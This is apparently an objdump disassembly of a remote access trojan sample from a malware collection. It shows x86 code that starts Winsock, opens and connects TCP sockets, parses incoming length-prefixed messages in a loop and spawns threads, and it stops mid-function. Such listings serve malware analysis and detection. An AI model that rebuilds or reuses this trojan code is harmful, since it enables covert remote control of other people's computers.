
malware_samples/rat/85b7d5979c80bd3e34ccdf0f9c2f86627d918d946e1112bf67078179176364a3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	e8 05 00 00 00       	call   0x40100a
  401005:	e9 12 00 00 00       	jmp    0x40101c
  40100a:	68 98 d4 40 00       	push   $0x40d498
  40100f:	68 68 11 41 00       	push   $0x411168
  401014:	e8 6a a3 00 00       	call   0x40b383
  401019:	59                   	pop    %ecx
  40101a:	59                   	pop    %ecx
  40101b:	c3                   	ret
  40101c:	68 28 10 40 00       	push   $0x401028
  401021:	e8 92 b3 00 00       	call   0x40c3b8
  401026:	59                   	pop    %ecx
  401027:	c3                   	ret
  401028:	b9 68 11 41 00       	mov    $0x411168,%ecx
  40102d:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  401033:	e8 05 00 00 00       	call   0x40103d
  401038:	e9 15 00 00 00       	jmp    0x401052
  40103d:	55                   	push   %ebp
  40103e:	8b ec                	mov    %esp,%ebp
  401040:	51                   	push   %ecx
  401041:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401044:	b9 58 11 41 00       	mov    $0x411158,%ecx
  401049:	50                   	push   %eax
  40104a:	ff 15 dc d2 40 00    	call   *0x40d2dc
  401050:	c9                   	leave
  401051:	c3                   	ret
  401052:	68 5e 10 40 00       	push   $0x40105e
  401057:	e8 5c b3 00 00       	call   0x40c3b8
  40105c:	59                   	pop    %ecx
  40105d:	c3                   	ret
  40105e:	b9 58 11 41 00       	mov    $0x411158,%ecx
  401063:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  401069:	e9 00 00 00 00       	jmp    0x40106e
  40106e:	b9 88 11 41 00       	mov    $0x411188,%ecx
  401073:	e9 1d 10 00 00       	jmp    0x402095
  401078:	55                   	push   %ebp
  401079:	8b ec                	mov    %esp,%ebp
  40107b:	51                   	push   %ecx
  40107c:	56                   	push   %esi
  40107d:	8b f1                	mov    %ecx,%esi
  40107f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401082:	50                   	push   %eax
  401083:	8d 4e 18             	lea    0x18(%esi),%ecx
  401086:	ff 15 dc d2 40 00    	call   *0x40d2dc
  40108c:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  401090:	74 07                	je     0x401099
  401092:	8b ce                	mov    %esi,%ecx
  401094:	e8 07 00 00 00       	call   0x4010a0
  401099:	8b c6                	mov    %esi,%eax
  40109b:	5e                   	pop    %esi
  40109c:	c9                   	leave
  40109d:	c2 04 00             	ret    $0x4
  4010a0:	80 3d 88 15 41 00 00 	cmpb   $0x0,0x411588
  4010a7:	56                   	push   %esi
  4010a8:	8b f1                	mov    %ecx,%esi
  4010aa:	75 09                	jne    0x4010b5
  4010ac:	e8 2b 00 00 00       	call   0x4010dc
  4010b1:	84 c0                	test   %al,%al
  4010b3:	74 12                	je     0x4010c7
  4010b5:	6a 06                	push   $0x6
  4010b7:	6a 01                	push   $0x1
  4010b9:	6a 00                	push   $0x0
  4010bb:	e8 28 b6 00 00       	call   0x40c6e8
  4010c0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4010c3:	89 06                	mov    %eax,(%esi)
  4010c5:	75 04                	jne    0x4010cb
  4010c7:	32 c0                	xor    %al,%al
  4010c9:	5e                   	pop    %esi
  4010ca:	c3                   	ret
  4010cb:	80 66 38 00          	andb   $0x0,0x38(%esi)
  4010cf:	80 66 39 00          	andb   $0x0,0x39(%esi)
  4010d3:	c7 46 34 e8 03 00 00 	movl   $0x3e8,0x34(%esi)
  4010da:	5e                   	pop    %esi
  4010db:	c3                   	ret
  4010dc:	55                   	push   %ebp
  4010dd:	8b ec                	mov    %esp,%ebp
  4010df:	81 ec 90 01 00 00    	sub    $0x190,%esp
  4010e5:	8d 85 70 fe ff ff    	lea    -0x190(%ebp),%eax
  4010eb:	50                   	push   %eax
  4010ec:	68 02 02 00 00       	push   $0x202
  4010f1:	e8 f8 b5 00 00       	call   0x40c6ee
  4010f6:	f7 d8                	neg    %eax
  4010f8:	1a c0                	sbb    %al,%al
  4010fa:	fe c0                	inc    %al
  4010fc:	a2 88 15 41 00       	mov    %al,0x411588
  401101:	c9                   	leave
  401102:	c3                   	ret
  401103:	55                   	push   %ebp
  401104:	8b ec                	mov    %esp,%ebp
  401106:	56                   	push   %esi
  401107:	8d 41 04             	lea    0x4(%ecx),%eax
  40110a:	57                   	push   %edi
  40110b:	8d 75 08             	lea    0x8(%ebp),%esi
  40110e:	8b f8                	mov    %eax,%edi
  401110:	6a 10                	push   $0x10
  401112:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401113:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401114:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401115:	50                   	push   %eax
  401116:	ff 31                	push   (%ecx)
  401118:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401119:	e8 d6 b5 00 00       	call   0x40c6f4
  40111e:	f7 d8                	neg    %eax
  401120:	1a c0                	sbb    %al,%al
  401122:	5f                   	pop    %edi
  401123:	fe c0                	inc    %al
  401125:	5e                   	pop    %esi
  401126:	5d                   	pop    %ebp
  401127:	c2 10 00             	ret    $0x10
  40112a:	55                   	push   %ebp
  40112b:	8b ec                	mov    %esp,%ebp
  40112d:	56                   	push   %esi
  40112e:	8d 45 0c             	lea    0xc(%ebp),%eax
  401131:	ff 31                	push   (%ecx)
  401133:	83 ec 10             	sub    $0x10,%esp
  401136:	8b cc                	mov    %esp,%ecx
  401138:	50                   	push   %eax
  401139:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40113f:	ff 75 08             	push   0x8(%ebp)
  401142:	e8 5a 03 00 00       	call   0x4014a1
  401147:	83 c4 18             	add    $0x18,%esp
  40114a:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40114d:	8b f0                	mov    %eax,%esi
  40114f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401155:	8b c6                	mov    %esi,%eax
  401157:	5e                   	pop    %esi
  401158:	5d                   	pop    %ebp
  401159:	c2 14 00             	ret    $0x14
  40115c:	56                   	push   %esi
  40115d:	8b f1                	mov    %ecx,%esi
  40115f:	ff 36                	push   (%esi)
  401161:	e8 94 b5 00 00       	call   0x40c6fa
  401166:	83 26 00             	andl   $0x0,(%esi)
  401169:	5e                   	pop    %esi
  40116a:	c3                   	ret
  40116b:	56                   	push   %esi
  40116c:	8b f1                	mov    %ecx,%esi
  40116e:	ff 36                	push   (%esi)
  401170:	e8 85 b5 00 00       	call   0x40c6fa
  401175:	8d 4e 18             	lea    0x18(%esi),%ecx
  401178:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40117e:	5e                   	pop    %esi
  40117f:	c3                   	ret
  401180:	55                   	push   %ebp
  401181:	8b ec                	mov    %esp,%ebp
  401183:	8b 45 08             	mov    0x8(%ebp),%eax
  401186:	89 41 14             	mov    %eax,0x14(%ecx)
  401189:	33 c0                	xor    %eax,%eax
  40118b:	50                   	push   %eax
  40118c:	50                   	push   %eax
  40118d:	51                   	push   %ecx
  40118e:	68 9f 11 40 00       	push   $0x40119f
  401193:	50                   	push   %eax
  401194:	50                   	push   %eax
  401195:	ff 15 58 d1 40 00    	call   *0x40d158
  40119b:	5d                   	pop    %ebp
  40119c:	c2 04 00             	ret    $0x4
  40119f:	55                   	push   %ebp
  4011a0:	8b ec                	mov    %esp,%ebp
  4011a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4011a5:	6a 00                	push   $0x0
  4011a7:	ff 71 14             	push   0x14(%ecx)
  4011aa:	e8 02 00 00 00       	call   0x4011b1
  4011af:	5d                   	pop    %ebp
  4011b0:	c3                   	ret
  4011b1:	55                   	push   %ebp
  4011b2:	8b ec                	mov    %esp,%ebp
  4011b4:	83 ec 34             	sub    $0x34,%esp
  4011b7:	53                   	push   %ebx
  4011b8:	56                   	push   %esi
  4011b9:	8b f1                	mov    %ecx,%esi
  4011bb:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4011be:	57                   	push   %edi
  4011bf:	50                   	push   %eax
  4011c0:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4011c3:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4011c9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4011cc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4011cf:	50                   	push   %eax
  4011d0:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4011d6:	83 66 30 00          	andl   $0x0,0x30(%esi)
  4011da:	ff 76 34             	push   0x34(%esi)
  4011dd:	ff 15 7c d3 40 00    	call   *0x40d37c
  4011e3:	59                   	pop    %ecx
  4011e4:	8b d8                	mov    %eax,%ebx
  4011e6:	6a 00                	push   $0x0
  4011e8:	ff 76 34             	push   0x34(%esi)
  4011eb:	53                   	push   %ebx
  4011ec:	ff 36                	push   (%esi)
  4011ee:	e8 0d b5 00 00       	call   0x40c700
  4011f3:	8b f8                	mov    %eax,%edi
  4011f5:	85 ff                	test   %edi,%edi
  4011f7:	7e 49                	jle    0x401242
  4011f9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4011fc:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4011ff:	50                   	push   %eax
  401200:	57                   	push   %edi
  401201:	53                   	push   %ebx
  401202:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  401208:	50                   	push   %eax
  401209:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40120c:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  401212:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  401215:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40121b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40121e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401221:	50                   	push   %eax
  401222:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  401228:	29 7e 30             	sub    %edi,0x30(%esi)
  40122b:	83 7e 30 00          	cmpl   $0x0,0x30(%esi)
  40122f:	7f 11                	jg     0x401242
  401231:	ff 75 0c             	push   0xc(%ebp)
  401234:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401237:	8b ce                	mov    %esi,%ecx
  401239:	ff 75 08             	push   0x8(%ebp)
  40123c:	50                   	push   %eax
  40123d:	e8 3d 00 00 00       	call   0x40127f
  401242:	53                   	push   %ebx
  401243:	ff 15 80 d3 40 00    	call   *0x40d380
  401249:	85 ff                	test   %edi,%edi
  40124b:	59                   	pop    %ecx
  40124c:	7f 8c                	jg     0x4011da
  40124e:	8b ce                	mov    %esi,%ecx
  401250:	e8 26 00 00 00       	call   0x40127b
  401255:	84 c0                	test   %al,%al
  401257:	74 09                	je     0x401262
  401259:	6a 01                	push   $0x1
  40125b:	8b ce                	mov    %esi,%ecx
  40125d:	e8 ca 04 00 00       	call   0x40172c
  401262:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401265:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40126b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40126e:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401274:	5f                   	pop    %edi
  401275:	5e                   	pop    %esi
  401276:	5b                   	pop    %ebx
  401277:	c9                   	leave
  401278:	c2 08 00             	ret    $0x8
  40127b:	8a 41 38             	mov    0x38(%ecx),%al
  40127e:	c3                   	ret
  40127f:	55                   	push   %ebp
  401280:	8b ec                	mov    %esp,%ebp
  401282:	83 ec 58             	sub    $0x58,%esp
  401285:	53                   	push   %ebx
  401286:	56                   	push   %esi
  401287:	8b f1                	mov    %ecx,%esi
  401289:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40128c:	57                   	push   %edi
  40128d:	50                   	push   %eax
  40128e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401291:	ff 15 dc d2 40 00    	call   *0x40d2dc
  401297:	33 db                	xor    %ebx,%ebx
  401299:	89 5e 30             	mov    %ebx,0x30(%esi)
  40129c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40129f:	68 a0 d4 40 00       	push   $0x40d4a0
  4012a4:	68 58 11 41 00       	push   $0x411158
  4012a9:	ff 15 b4 d2 40 00    	call   *0x40d2b4
  4012af:	59                   	pop    %ecx
  4012b0:	84 c0                	test   %al,%al
  4012b2:	59                   	pop    %ecx
  4012b3:	74 37                	je     0x4012ec
  4012b5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4012b8:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4012be:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4012c1:	50                   	push   %eax
  4012c2:	ff 15 bc d2 40 00    	call   *0x40d2bc
  4012c8:	50                   	push   %eax
  4012c9:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4012cc:	50                   	push   %eax
  4012cd:	b9 88 11 41 00       	mov    $0x411188,%ecx
  4012d2:	e8 a9 0e 00 00       	call   0x402180
  4012d7:	50                   	push   %eax
  4012d8:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4012db:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4012e1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4012e4:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4012ea:	eb 0c                	jmp    0x4012f8
  4012ec:	ff 75 08             	push   0x8(%ebp)
  4012ef:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4012f2:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4012f8:	8d 46 34             	lea    0x34(%esi),%eax
  4012fb:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4012fe:	50                   	push   %eax
  4012ff:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401302:	50                   	push   %eax
  401303:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401309:	50                   	push   %eax
  40130a:	e8 42 01 00 00       	call   0x401451
  40130f:	83 c4 0c             	add    $0xc,%esp
  401312:	84 c0                	test   %al,%al
  401314:	0f 84 27 01 00 00    	je     0x401441
  40131a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40131d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401320:	8d 78 0f             	lea    0xf(%eax),%edi
  401323:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  401329:	3b f8                	cmp    %eax,%edi
  40132b:	0f 87 02 01 00 00    	ja     0x401433
  401331:	68 a0 d4 40 00       	push   $0x40d4a0
  401336:	68 58 11 41 00       	push   $0x411158
  40133b:	ff 15 b4 d2 40 00    	call   *0x40d2b4
  401341:	59                   	pop    %ecx
  401342:	84 c0                	test   %al,%al
  401344:	59                   	pop    %ecx
  401345:	75 0c                	jne    0x401353
  401347:	ff 75 08             	push   0x8(%ebp)
  40134a:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40134d:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  401353:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  401358:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40135b:	ff 30                	push   (%eax)
  40135d:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401360:	6a 0f                	push   $0xf
  401362:	50                   	push   %eax
  401363:	ff 15 cc d2 40 00    	call   *0x40d2cc
  401369:	50                   	push   %eax
  40136a:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40136d:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  401373:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401376:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40137c:	ff 75 f8             	push   -0x8(%ebp)
  40137f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401382:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401385:	53                   	push   %ebx
  401386:	50                   	push   %eax
  401387:	ff 15 cc d2 40 00    	call   *0x40d2cc
  40138d:	50                   	push   %eax
  40138e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401391:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  401397:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40139a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4013a0:	38 5d 10             	cmp    %bl,0x10(%ebp)
  4013a3:	75 18                	jne    0x4013bd
  4013a5:	83 ec 10             	sub    $0x10,%esp
  4013a8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4013ab:	8b cc                	mov    %esp,%ecx
  4013ad:	50                   	push   %eax
  4013ae:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4013b4:	56                   	push   %esi
  4013b5:	ff 55 0c             	call   *0xc(%ebp)
  4013b8:	83 c4 14             	add    $0x14,%esp
  4013bb:	eb 3c                	jmp    0x4013f9
  4013bd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4013c0:	8d 4e 18             	lea    0x18(%esi),%ecx
  4013c3:	50                   	push   %eax
  4013c4:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4013ca:	53                   	push   %ebx
  4013cb:	53                   	push   %ebx
  4013cc:	53                   	push   %ebx
  4013cd:	53                   	push   %ebx
  4013ce:	ff 15 9c d1 40 00    	call   *0x40d19c
  4013d4:	53                   	push   %ebx
  4013d5:	53                   	push   %ebx
  4013d6:	56                   	push   %esi
  4013d7:	89 46 28             	mov    %eax,0x28(%esi)
  4013da:	ff 75 0c             	push   0xc(%ebp)
  4013dd:	53                   	push   %ebx
  4013de:	53                   	push   %ebx
  4013df:	ff 15 58 d1 40 00    	call   *0x40d158
  4013e5:	6a ff                	push   $0xffffffff
  4013e7:	ff 76 28             	push   0x28(%esi)
  4013ea:	ff 15 a0 d1 40 00    	call   *0x40d1a0
  4013f0:	ff 76 28             	push   0x28(%esi)
  4013f3:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  4013f9:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  4013fe:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401401:	ff 30                	push   (%eax)
  401403:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401406:	57                   	push   %edi
  401407:	50                   	push   %eax
  401408:	ff 15 cc d2 40 00    	call   *0x40d2cc
  40140e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401411:	50                   	push   %eax
  401412:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  401418:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40141b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401421:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401424:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40142a:	85 c0                	test   %eax,%eax
  40142c:	74 13                	je     0x401441
  40142e:	e9 6c fe ff ff       	jmp    0x40129f
  401433:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401436:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40143c:	2b f8                	sub    %eax,%edi
  40143e:	89 7e 30             	mov    %edi,0x30(%esi)
  401441:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401444:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40144a:	5f                   	pop    %edi
  40144b:	5e                   	pop    %esi
  40144c:	5b                   	pop    %ebx
  40144d:	c9                   	leave
  40144e:	c2 0c 00             	ret    $0xc
  401451:	55                   	push   %ebp
  401452:	8b ec                	mov    %esp,%ebp
  401454:	56                   	push   %esi
  401455:	8b 75 08             	mov    0x8(%ebp),%esi
  401458:	6a 0b                	push   $0xb
  40145a:	56                   	push   %esi
  40145b:	68 a4 d4 40 00       	push   $0x40d4a4
  401460:	ff 15 78 d3 40 00    	call   *0x40d378
  401466:	83 c4 0c             	add    $0xc,%esp
  401469:	85 c0                	test   %eax,%eax
  40146b:	75 2f                	jne    0x40149c
  40146d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401470:	8b 46 0b             	mov    0xb(%esi),%eax
  401473:	57                   	push   %edi
  401474:	89 01                	mov    %eax,(%ecx)
  401476:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401479:	8d 78 0f             	lea    0xf(%eax),%edi
  40147c:	8b 11                	mov    (%ecx),%edx
  40147e:	8d 34 12             	lea    (%edx,%edx,1),%esi
  401481:	3b fe                	cmp    %esi,%edi
  401483:	5f                   	pop    %edi
  401484:	76 12                	jbe    0x401498
  401486:	2b c2                	sub    %edx,%eax
  401488:	ba e8 fd 00 00       	mov    $0xfde8,%edx
  40148d:	83 c0 0f             	add    $0xf,%eax
  401490:	3b c2                	cmp    %edx,%eax
  401492:	89 01                	mov    %eax,(%ecx)
  401494:	76 02                	jbe    0x401498
  401496:	89 11                	mov    %edx,(%ecx)
  401498:	b0 01                	mov    $0x1,%al
  40149a:	eb 02                	jmp    0x40149e
  40149c:	32 c0                	xor    %al,%al
  40149e:	5e                   	pop    %esi
  40149f:	5d                   	pop    %ebp
  4014a0:	c3                   	ret
  4014a1:	55                   	push   %ebp
  4014a2:	8b ec                	mov    %esp,%ebp
  4014a4:	83 ec 24             	sub    $0x24,%esp
  4014a7:	56                   	push   %esi
  4014a8:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4014ab:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  4014b1:	8b f0                	mov    %eax,%esi
  4014b3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4014b6:	50                   	push   %eax
  4014b7:	6a 13                	push   $0x13
  4014b9:	68 a4 d4 40 00       	push   $0x40d4a4
  4014be:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4014c1:	83 c6 04             	add    $0x4,%esi
  4014c4:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  4014ca:	6a 0b                	push   $0xb
  4014cc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4014cf:	ff 15 ac d2 40 00    	call   *0x40d2ac
  4014d5:	6a 0f                	push   $0xf
  4014d7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4014da:	89 30                	mov    %esi,(%eax)
  4014dc:	ff 15 ac d2 40 00    	call   *0x40d2ac
  4014e2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4014e5:	89 08                	mov    %ecx,(%eax)
  4014e7:	8d 45 0c             	lea    0xc(%ebp),%eax
  4014ea:	50                   	push   %eax
  4014eb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4014ee:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  4014f4:	b9 58 11 41 00       	mov    $0x411158,%ecx
  4014f9:	ff 15 b0 d2 40 00    	call   *0x40d2b0
  4014ff:	84 c0                	test   %al,%al
  401501:	74 22                	je     0x401525
  401503:	6a 00                	push   $0x0
  401505:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401508:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40150e:	50                   	push   %eax
  40150f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401512:	ff 15 bc d2 40 00    	call   *0x40d2bc
  401518:	50                   	push   %eax
  401519:	ff 75 1c             	push   0x1c(%ebp)
  40151c:	e8 e5 b1 00 00       	call   0x40c706
  401521:	8b f0                	mov    %eax,%esi
  401523:	eb 4b                	jmp    0x401570
  401525:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401528:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40152e:	50                   	push   %eax
  40152f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401532:	ff 15 bc d2 40 00    	call   *0x40d2bc
  401538:	50                   	push   %eax
  401539:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40153c:	50                   	push   %eax
  40153d:	b9 88 11 41 00       	mov    $0x411188,%ecx
  401542:	e8 39 0c 00 00       	call   0x402180
  401547:	6a 00                	push   $0x0
  401549:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40154c:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  401552:	50                   	push   %eax
  401553:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401556:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40155c:	50                   	push   %eax
  40155d:	ff 75 1c             	push   0x1c(%ebp)
  401560:	e8 a1 b1 00 00       	call   0x40c706
  401565:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401568:	8b f0                	mov    %eax,%esi
  40156a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401570:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401573:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401579:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40157c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401582:	8b c6                	mov    %esi,%eax
  401584:	5e                   	pop    %esi
  401585:	c9                   	leave
  401586:	c3                   	ret
  401587:	55                   	push   %ebp
  401588:	8b ec                	mov    %esp,%ebp
  40158a:	56                   	push   %esi
  40158b:	6a 06                	push   $0x6
  40158d:	6a 01                	push   $0x1
  40158f:	6a 00                	push   $0x0
  401591:	e8 52 b1 00 00       	call   0x40c6e8
  401596:	8b f0                	mov    %eax,%esi
  401598:	6a 10                	push   $0x10
  40159a:	68 78 11 41 00       	push   $0x411178
  40159f:	56                   	push   %esi
  4015a0:	e8 4f b1 00 00       	call   0x40c6f4
  4015a5:	85 c0                	test   %eax,%eax
  4015a7:	75 21                	jne    0x4015ca
  4015a9:	56                   	push   %esi
  4015aa:	8d 45 0c             	lea    0xc(%ebp),%eax
  4015ad:	83 ec 10             	sub    $0x10,%esp
  4015b0:	8b cc                	mov    %esp,%ecx
  4015b2:	50                   	push   %eax
  4015b3:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4015b9:	ff 75 08             	push   0x8(%ebp)
  4015bc:	e8 e0 fe ff ff       	call   0x4014a1
  4015c1:	83 c4 18             	add    $0x18,%esp
  4015c4:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  4015c8:	74 09                	je     0x4015d3
  4015ca:	56                   	push   %esi
  4015cb:	e8 2a b1 00 00       	call   0x40c6fa
  4015d0:	83 ce ff             	or     $0xffffffff,%esi
  4015d3:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4015d6:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4015dc:	8b c6                	mov    %esi,%eax
  4015de:	5e                   	pop    %esi
  4015df:	5d                   	pop    %ebp
  4015e0:	c3                   	ret
  4015e1:	55                   	push   %ebp
  4015e2:	8b ec                	mov    %esp,%ebp
  4015e4:	83 ec 30             	sub    $0x30,%esp
  4015e7:	53                   	push   %ebx
  4015e8:	56                   	push   %esi
  4015e9:	8b f1                	mov    %ecx,%esi
  4015eb:	33 db                	xor    %ebx,%ebx
  4015ed:	38 5e 38             	cmp    %bl,0x38(%esi)
  4015f0:	0f 85 8f 00 00 00    	jne    0x401685
  4015f6:	38 1d 18 1a 41 00    	cmp    %bl,0x411a18
  4015fc:	57                   	push   %edi
  4015fd:	8b 7d 08             	mov    0x8(%ebp),%edi
  401600:	74 67                	je     0x401669
  401602:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401605:	50                   	push   %eax
  401606:	ff 15 98 d1 40 00    	call   *0x40d198
  40160c:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  401610:	57                   	push   %edi
  401611:	50                   	push   %eax
  401612:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  401616:	50                   	push   %eax
  401617:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40161a:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  40161e:	50                   	push   %eax
  40161f:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  401623:	50                   	push   %eax
  401624:	8d 45 0b             	lea    0xb(%ebp),%eax
  401627:	68 cc d4 40 00       	push   $0x40d4cc
  40162c:	50                   	push   %eax
  40162d:	68 b0 d4 40 00       	push   $0x40d4b0
  401632:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401638:	50                   	push   %eax
  401639:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40163c:	50                   	push   %eax
  40163d:	e8 5e b0 00 00       	call   0x40c6a0
  401642:	83 c4 0c             	add    $0xc,%esp
  401645:	8b c8                	mov    %eax,%ecx
  401647:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40164d:	50                   	push   %eax
  40164e:	ff 15 74 d3 40 00    	call   *0x40d374
  401654:	83 c4 18             	add    $0x18,%esp
  401657:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40165a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401660:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401663:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401669:	53                   	push   %ebx
  40166a:	53                   	push   %ebx
  40166b:	56                   	push   %esi
  40166c:	68 7e 17 40 00       	push   $0x40177e
  401671:	53                   	push   %ebx
  401672:	53                   	push   %ebx
  401673:	c6 46 38 01          	movb   $0x1,0x38(%esi)
  401677:	89 7e 3c             	mov    %edi,0x3c(%esi)
  40167a:	ff 15 58 d1 40 00    	call   *0x40d158
  401680:	b0 01                	mov    $0x1,%al
  401682:	5f                   	pop    %edi
  401683:	eb 02                	jmp    0x401687
  401685:	32 c0                	xor    %al,%al
  401687:	5e                   	pop    %esi
  401688:	5b                   	pop    %ebx
  401689:	c9                   	leave
  40168a:	c2 04 00             	ret    $0x4
  40168d:	55                   	push   %ebp
  40168e:	8b ec                	mov    %esp,%ebp
  401690:	83 ec 30             	sub    $0x30,%esp
  401693:	56                   	push   %esi
  401694:	8b f1                	mov    %ecx,%esi
  401696:	80 7e 38 00          	cmpb   $0x0,0x38(%esi)
  40169a:	0f 84 85 00 00 00    	je     0x401725
  4016a0:	80 3d 18 1a 41 00 00 	cmpb   $0x0,0x411a18
  4016a7:	57                   	push   %edi
  4016a8:	8b 7d 08             	mov    0x8(%ebp),%edi
  4016ab:	74 6c                	je     0x401719
  4016ad:	39 7e 3c             	cmp    %edi,0x3c(%esi)
  4016b0:	74 67                	je     0x401719
